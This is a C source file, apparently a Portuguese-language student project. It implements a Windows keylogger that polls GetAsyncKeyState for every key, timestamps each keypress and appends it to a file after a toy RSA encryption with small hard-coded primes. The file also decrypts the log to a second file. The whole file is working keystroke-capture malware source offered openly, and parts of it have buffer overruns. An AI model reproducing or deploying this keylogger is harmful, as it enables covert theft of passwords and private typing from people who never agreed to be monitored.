// Filename: keylogger.c 
//original version by: Mharcos Nesster
//original version criptografia by: Esthefanie Lanza
//edited by: Anne, Joseph, Henrixss

#include <stdio.h>  
#include <windows.h>
#include <time.h>
#include <stdlib.h>
#include <math.h>
#include<string.h>

char *mensagemD;

//Descobre se um número é primo verificando se ele é divisível para qualquer i até a sua raiz quadrada
long long verificaPrimo(long long p){

	long long i;
	double j;
	
	//Calcula a raiz quadrada para p
	j = sqrt(p);


	for(i = 2; i <= j; i++){
		//Retorna 0 caso não seja um número primo
		if(p%i == 0)
			return 0;
	}

	//Retorna 1 quando é um número primo
	return 1;
}


//Calcula o resto e o quociente de uma divisão
void divisao(long long *resto, long long *quociente, long long a, long long b){

	if(a >= 0){

		*quociente = 0;
		*resto = a;

		while(*resto >= b){

			*resto -= b;
			*quociente = *quociente + 1;
		}
	}

}

//Escolhe o menor primo que divide o coeficiente de euler. Obs: Ele deve ser diferente de p e p2.
long long escolheE(long long phi, long long p, long long p2, long long n){
	//procura um valor maior que 1 e menor que phi que seja coprimo de n
	long long i, e;
	for(i = 2; i < phi; i++){

		if(phi%i != 0 && verificaPrimo(i) && i != p && i != p2){
			e = i;
			break;
		}
	}

	return e;
}

//Calcula o mdc estendido e retorna o beta(inverso do e módulo phi) para ser o d
long long mdcEstendido(long long a, long long b){
	
	long long resto, quociente, xB = 1, yB = 0, x = 0, y = 1, alpha, beta, phi;
	phi = a;

	resto = a;
	while(resto != 0){
		divisao(&resto, &quociente, a, b);
		a = b;
		b = resto;
		if(resto > 0){
			alpha = xB - quociente *x;
			beta = yB - quociente * y;

			xB = x;
			yB = y;
			x = alpha;
			y = beta;
		}
	}

	if(beta < 0)
		beta = phi + beta;

	return beta;

}

//Calcula a forma reduzida de a^e módulo n, usando a expansão binária do expoente
long potencia(long long a, long long e, long long n){
	
	long long A = a, P = 1, E = e;
	
	while(1){

		//Chegou ao fim da expansão, retorna o P
		if(E == 0)
			return P;

		//Se o expoente é ímpar
		else if(E%2 != 0){
			//Realizamos a redução módulo n de cada uma das multpilicações 			
			P = (A * P)%n;
			E = (E-1)/2;
		}

		//Se o expoente é par
		else{
			E = E/2;
		}
		//Obtém a sequência de potências
		A = (A*A)%n;
	}
	
}

//Codifica uma string de caracteres usando o resto da divisão de a^e por n para cada caractere, para a é utilizado o código da tabela ASCII
int *codifica(char *mensagem, long long e, long long n){
	
	long long i;
	int *mensagemC;

	mensagemC = malloc(50 * sizeof(long long));
	for(i = 0; i < 50; i++){
		mensagemC[i] = potencia(mensagem[i], e, n);
	}

	//Retorna um vetor de long longeiros
	return mensagemC;
}

//Decodifica um vetor de inteiros em uma string de caracteres usando o resto da divisão de a^d por n para cada inteiro
void decodifica(int *mensagemC, long long de, long long num){
	
	long long i;
	FILE *file;
        file = fopen("decripto.txt", "a+");
 
        if(file == NULL) {
            printf("Erro ao criar o Arquivo test.txt.\n");
            exit(1);
        }
		
	mensagemD = malloc(100 * sizeof(char));
	
	for(i = 0; i < 100; i++){
		mensagemD[i] = potencia(mensagemC[i], de, num);
	}
	
	fputs(mensagemD,file);
	fclose(file);

}


void criptografia(char *mensagem){
	
	FILE *file;
    file = fopen("cripto.txt", "a+");
 
    if(file == NULL) {
        printf("Erro ao criar o Arquivo test.txt.\n");
        exit(1);
    }
	
	long long i;
	long long p=97, p2=89, n, phi, e, d;
	int *mensagemC;
	
	//Calcula o n
	n = p * p2;
	
	//Calcula o quociente ou totiente de euler
	phi = (p - 1)*(p2 - 1);

	//Escolhe o e para calcular a chave publica
	e = escolheE(phi, p, p2, n);
	
	printf("\nChave publica: (%llu, %llu)\n", e, n);

	//Escolhe o d para calcular a chave privada
	d = mdcEstendido(phi, e);

	printf("\nChave privada: (%llu, %llu,%llu)\n", p,p2, d);

	//Codifica a mensagem
	mensagemC = codifica(mensagem, e, n);
	
	for(i = 0; i < strlen(mensagem); i++){
		fputc(mensagemC[i],file);
		
	}
	
	fclose(file);
	
	//Decodifica a mensagem
	//char *mensagemD;
	decodifica(mensagemC, d, n);
	//colocanoarquivo(mensagemD);
	//printf("\nMensagem decriptada: %s\n\n", mensagemD);
	
}

 
int main() {
    short i;  // contador 
    short keyState;  // comparar key
	
	time_t rawtime;
	struct tm * timeinfo;
	char tempo[25];
	char buff[50];
	
    while(1) {
        for(i = 0; i <= 255; i++) {
			time ( &rawtime );
			timeinfo = localtime ( &rawtime );
            keyState = GetAsyncKeyState(i);
            if(keyState == -32767) {
                Sleep(30);
                
				
				strcpy(tempo, asctime (timeinfo));
				tempo[24] = ':';
				tempo[25] = '\0';
				
				
				strcpy(buff, tempo);
				
                switch(i) {
					case 0x30:
					strcat(buff, " 0\r\n");
					criptografia(buff);
					break;
					case 0x31:
					strcat(buff, " 1\r\n");
					criptografia(buff);
					break;
					case 0x32:
					strcat(buff, " 2\r\n");
					criptografia(buff);
					
					break;
					case 0x33:
					strcat(buff, " 3\r\n");
					criptografia(buff);
					
					break;
					case 0x34:
					strcat(buff, " 4\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x35:
					strcat(buff, " 5\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x36:
					strcat(buff, " 6\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x37:
					strcat(buff, " 7\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x38:
					strcat(buff, " 8\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x39:
					strcat(buff, " 9\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x41:
					strcat(buff, " A\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x42:
					strcat(buff, " B\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x43:
					strcat(buff, " C\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x44:
					strcat(buff, " D\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x45:
					strcat(buff, " E\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x46:
					strcat(buff, " F\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x47:
					strcat(buff, " G\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x48:
					strcat(buff, " H\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x49:
					strcat(buff, " I\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4A:
					strcat(buff, " J\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4B:
					strcat(buff, " K\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4C:
					strcat(buff, " L\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4D:
					strcat(buff, " M\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4E:
					strcat(buff, " N\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x4F:
					strcat(buff, " O\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x50:
					strcat(buff, " P\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x51:
					strcat(buff, " Q\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x52:
					strcat(buff, " R\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x53:
					strcat(buff, " S\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x54:
					strcat(buff, " T\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x55:
					strcat(buff, " U\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x56:
					strcat(buff, " V\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x57:
					strcat(buff, " W\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x58:
					strcat(buff, " X\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x59:
					strcat(buff, " Y\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case 0x5A:
					strcat(buff, " Z\r\n");
					criptografia(buff);
					//fclose(file);
					break;
                    case VK_SPACE:
					strcat(buff, " [SPACEBAR]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_SHIFT:
					strcat(buff, " [SHIFT]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_RETURN:
					strcat(buff, " [ENTER]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_BACK:
					strcat(buff, " [BACKSPACE]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_TAB:
					strcat(buff, " [TAB]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_CONTROL:
					strcat(buff, " [CTRL]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MENU:
					strcat(buff, " [ALT]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_PRIOR:
					strcat(buff, " [PAGE UP]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_NEXT:
					strcat(buff, " [PAGE DOWN]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_END:
					strcat(buff, " [END]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_HOME:
					strcat(buff, " [HOME]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_LEFT:
					strcat(buff, " [LEFT ARROW]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_UP:
					strcat(buff, " [UP ARROW]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_RIGHT:
					strcat(buff, " [RIGHT ARROW]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_DOWN:
					strcat(buff, " [DOWN ARROW]\r\n");
					criptografia(buff);
					//fclose(file);
					break;
					case VK_SNAPSHOT:
					strcat(buff, " [PRINT SCREEN]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_INSERT:
					strcat(buff, " [INSERT]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_DELETE:
					strcat(buff, " [DEL]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_OEM_1:
					strcat(buff, " [;:]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_OEM_2:
					strcat(buff, " [/?]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_OEM_3:
					strcat(buff, " [`~]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_OEM_4:
					strcat(buff, " [[{]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    /*case VK_OEM_5:
					strcat(buff, " [\|]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;**/
                    case VK_OEM_6:
					strcat(buff, " []}]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_OEM_7:
					strcat(buff, " ['\"]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case 187:
					strcat(buff, " +\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case 188:
					strcat(buff, " ,\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case 189:
					strcat(buff, " -\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case 190:
					strcat(buff, " .\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD0:
					strcat(buff, " 0\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD1:
					strcat(buff, " 1\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD2:
					strcat(buff, " 2\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD3:
					strcat(buff, " 3\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD4:
					strcat(buff, " 4\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD5:
					strcat(buff, " 5\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD6:
					strcat(buff, " 6\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD7:
					strcat(buff, " 7\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD8:
					strcat(buff, " 8\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
                    case VK_NUMPAD9:
					strcat(buff, " 9\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MULTIPLY:
					strcat(buff, " *\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_ADD:
					strcat(buff, " +\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_SUBTRACT:
					strcat(buff, " -\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_DIVIDE:
					strcat(buff, " /\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F1:
					strcat(buff, " F1\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F2:
					strcat(buff, " F2\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F3:
					strcat(buff, " F3\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F4:
					strcat(buff, " F4\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F5:
					strcat(buff, " F5\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F6:
					strcat(buff, " F6\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F7:
					strcat(buff, " F7\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F8:
					strcat(buff, " F8\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F9:
					strcat(buff, " F9\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F10:
					strcat(buff, " F10\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F11:
					strcat(buff, " F11\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_F12:
					strcat(buff, " F12\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_NUMLOCK:
					strcat(buff, " [NUM LOCK]\r\n");
					criptografia(buff);
                    break;
					case VK_SCROLL:
					strcat(buff, " [SCROLL LOCK]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					/*
					case VK_VOLUME_MUTE:
					strcat(buff, " Volume Mute\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_VOLUME_DOWN:
					strcat(buff, " Volume Down\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_VOLUME_UP:
					strcat(buff, " Volume Up\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MEDIA_NEXT_TRACK:
					strcat(buff, " Next Track\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MEDIA_PREV_TRACK:
					strcat(buff, " Previous Track\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MEDIA_STOP:
					strcat(buff, " Stop Media\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_MEDIA_PLAY_PAUSE:
					strcat(buff, " Play/Pause Media\r\n");
					criptografia(buff);
					//fclose(file);
                    break;*/
                    case VK_CAPITAL:
					strcat(buff, " [CAPS LOCK]\r\n");
					criptografia(buff);
					//fclose(file);
                    break;
					case VK_ESCAPE:
					strcpy(buff, tempo);
					strcat(buff, " [ESC]\r\n");
					criptografia(buff);
					
					break;
                    default:
					/*
					fputs(tempo, file);
                    fputc(i, file);
					fputs("\r\n", file);
					*/
                    printf("");
                }
            }
        }
    }
    return 0;
}